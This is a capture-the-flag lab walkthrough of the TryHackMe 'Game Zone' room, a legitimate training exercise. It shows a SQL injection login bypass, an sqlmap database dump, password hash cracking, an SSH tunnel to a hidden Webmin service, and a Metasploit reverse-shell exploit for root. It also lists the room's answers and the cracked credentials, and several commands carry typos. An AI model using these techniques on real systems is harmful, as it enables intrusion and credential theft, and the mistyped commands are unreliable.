# TryHackMe: Game Zone


#### [Task 1] Deploy the vulnerable machine

This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges.

**What is the name of the large cartoon avatar holding a sniper on the forum?**

agent 47

#### [Task 2] Obtain access via SQLi

In this task you will understand more about SQL (structured query language) and how you can potentially manipulate queries to communicate with the database.
 
GameZone doesn't have an admin user in the database, however you can still login without knowing any credentials using the inputted password data we used in the previous question.

Use ' or 1=1 -- - as your username and leave the password blank.

<img width="1326" alt="2" src="https://user-images.githubusercontent.com/28839345/164976430-1a3fee53-35d3-42db-b20b-6553e3da69de.png">

<img width="1375" alt="1" src="https://user-images.githubusercontent.com/28839345/164976267-33b5bc47-a19c-44bd-bfe2-8802906e424c.png">

When you've logged in, what page do you get redirected to?
portal.php

#### [Task 3] Using SQLMap

SQLMap is a popular open-source, automatic SQL injection and database takeover tool. This comes pre-installed on all version of [Kali Linux](https://tryhackme.com/rooms/kali) or can be manually downloaded and installed [here](https://github.com/sqlmapproject/sqlmap).

There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.

SQLMap is a popular open-source, automatic SQL injection and database takeover tool. This comes pre-installed on all version of [Kali Linux](https://tryhackme.com/rooms/kali) or can be manually downloaded and installed [here](https://github.com/sqlmapproject/sqlmap).

There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.

Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.

Step 1. Open burp suite

Step 2. Enable Foxy proxy and type and type in search whatever you want

<img width="764" alt="3" src="https://user-images.githubusercontent.com/28839345/164976437-d47e1fb3-587a-4326-bca7-2557c3a91453.png">
Step 3. Press 'Search' and capture this request with burp suite

<img width="659" alt="4" src="https://user-images.githubusercontent.com/28839345/164976439-961a6e0e-0ae8-4c15-9f92-8ba45e73ef32.png">
Step 3. Save this request into a text file.

<img width="788" alt="5" src="https://user-images.githubusercontent.com/28839345/164976441-ff918b12-5fb7-492e-95da-a09259085036.png">

Step 4. Pass this into SQLMap to use our authenticated user session
To do this open your terminal and type 
`sqlmap -r request.txt --dbms=mysql --dump`

Scroll down

<img width="1432" alt="6" src="https://user-images.githubusercontent.com/28839345/164976444-36d1cbdb-bf56-4071-af61-6b25b2fde3e1.png">

<img width="1228" alt="7" src="https://user-images.githubusercontent.com/28839345/164976448-00f8ee89-faba-4692-baa4-1859c52b38e6.png">

**In the users table, what is the hashed password?**

ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

**What was the username associated with the hashed password?**

agent47

In the sql map find the following output which displays the other table name.

<img width="1334" alt="8" src="https://user-images.githubusercontent.com/28839345/164976449-c93d5c38-ead8-4ef2-aa2c-b5435d35c884.png">

**What was the other table name?**

post

#### [Task 4] Cracking a password with JohnTheRipper

 To crack the hashed password you can use JohnTheRipper.
 
 First copy the hash and paste it to a file.
 
<img width="671" alt="9" src="https://user-images.githubusercontent.com/28839345/164976451-23f75882-d841-4ef1-b914-fd6aa2c2921c.png">
 
 Run the following command 
 
 `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256`
 
<img width="999" alt="10" src="https://user-images.githubusercontent.com/28839345/164976452-986bb7b3-2a4f-4970-b40f-927c12bd0bc1.png">

 
**What is the de-hashed password?**

videogamer124

Now you have a password and username. Try SSH'ing onto the machine.

Run the command `ssh agent47@10.10.49.180` and enter the password 'videogamer124'.

<img width="795" alt="11" src="https://user-images.githubusercontent.com/28839345/164976537-3af21be7-16a5-411a-9287-88820b3ec5c5.png">
  
**What is the user flag?**

To get the users flag run the command `cat user.txt`

<img width="333" alt="12" src="https://user-images.githubusercontent.com/28839345/164976540-07ede178-1bc0-4925-badc-0b74c55641e0.png">

#### [Task 5] Exposing services with reverse SSH tunnels

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

**-L** is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do **ssh -L 9000:imgur.com:80 user@example.com.** Going to localhost:9000 on your machine, will load imgur traffic using your other server.

**-R** is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

To check the number of open TCP ports run the comand `ss -tulpn`.If we run `ss -tulpn` it will tell us what socket connections are running.

<img width="1216" alt="13" src="https://user-images.githubusercontent.com/28839345/164976542-d7cba917-a05c-4719-aa58-98bb0d39bf86.png">

**How many TCP sockets are running?**

5

Note: 
Peer Address:Port , is **useful when there is an active connection because it shows the address and port number of the client machine**

  
We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From your local machine, run `ssh -L 10000:localhost:10000 agent47@10.10.49.180`
and type password 'videogamer124'.

<img width="822" alt="14" src="https://user-images.githubusercontent.com/28839345/164976543-d26da6ba-0929-42c9-b5bf-8ff0f4ac4515.png">

After creating the ssh tunnel go to 'localhost:10000' in your local machine and type usernam 'agent47' and password 'videogamer124' to login.

<img width="1308" alt="15" src="https://user-images.githubusercontent.com/28839345/164976547-5d9a1e50-d3f7-4093-bcdf-4d6e71332a5d.png">

<img width="1369" alt="16" src="https://user-images.githubusercontent.com/28839345/164976549-b0789727-044b-4c67-a127-458c2d727829.png">

**What is the name of the exposed CMS?**

Webmin

<img width="1053" alt="17" src="https://user-images.githubusercontent.com/28839345/164976558-9a4ba59a-0b8d-4d1f-b1ec-2678ab995b1f.png">
  
**What is the CMS version?**

1.580

<img width="843" alt="18" src="https://user-images.githubusercontent.com/28839345/164976565-e2673bd3-a140-4d70-9a1e-7a4f9fb70606.png">

#### [Task 6] Priviledge Escalation with Metasploit

**Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.**

First open metapsloit by running the command `msfconsole`.

Then search for webmin exploits with version 1.580 by running the command 
`search webmin 1.580`.

<img width="1412" alt="19" src="https://user-images.githubusercontent.com/28839345/164976572-5a82efcb-2b40-41d4-bdb2-84cc0f0597b3.png">

The exploit you can use is the 'exploit/unix/webapp/webmin_upload_exec'.

`set RHOSTS localhost`

`set RPOTS 10000`

`set LHOSTS 10.10.173.37`

`set SSL false`

`set PAYLOAD cmd/unix/reverse`

`set USERNAME agen47`

`set PASSWORD videogamer124`

Finally run `exploit` and a session will be created in the background.

<img width="715" alt="20" src="https://user-images.githubusercontent.com/28839345/164976579-af6b5cd1-43e2-42dd-a425-37940944e52c.png">

Check the list of running sessions with the command `sessions -l`.

<img width="866" alt="21" src="https://user-images.githubusercontent.com/28839345/164976582-56286391-6b15-4b9e-a4dd-7d345c8282cc.png">

Pick the session you just created by running the command `session <session_number>`
In my case is `session 1`

<img width="563" alt="22" src="https://user-images.githubusercontent.com/28839345/164976584-43510d8d-ae8d-48f1-9766-deeb3832e91e.png">

Run the command `whomai` and check if you are 'root'.

<img width="136" alt="23" src="https://user-images.githubusercontent.com/28839345/164976585-367574fa-8cda-4651-b4c3-ac59a319858d.png">

Finally go to the '/root' directory and print the content of 'the root.txt' file by running the command `cat root.txt`

<img width="403" alt="24" src="https://user-images.githubusercontent.com/28839345/164976586-5c3ebbb0-b75a-481d-8f4e-227238469093.png">









